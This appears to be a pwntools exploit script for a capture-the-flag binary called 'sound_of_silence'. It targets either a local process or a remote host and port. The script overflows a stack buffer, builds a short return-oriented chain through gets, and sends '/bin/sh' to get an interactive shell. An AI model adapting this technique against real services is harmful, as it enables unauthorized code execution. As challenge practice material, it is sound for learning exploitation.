from pwn import *

if args.LOCAL:
    io = process('./sound_of_silence')
    if args.GDB:
        cmd = """

        """
        gdb.attach(io, cmd)
else:
    io =remote('94.237.54.48', 32279)
elf=ELF('./sound_of_silence')
# libc=ELF('./glibc/libc.so.6')

pause()
pl = b'A'*(32) + b'A'*8 + p64(elf.plt.gets) + p64(0x000000000040101a) +p64(0x0000000000401169)
io.sendline(pl)

io.sendline(b'////////bin/sh\0')
io.interactive()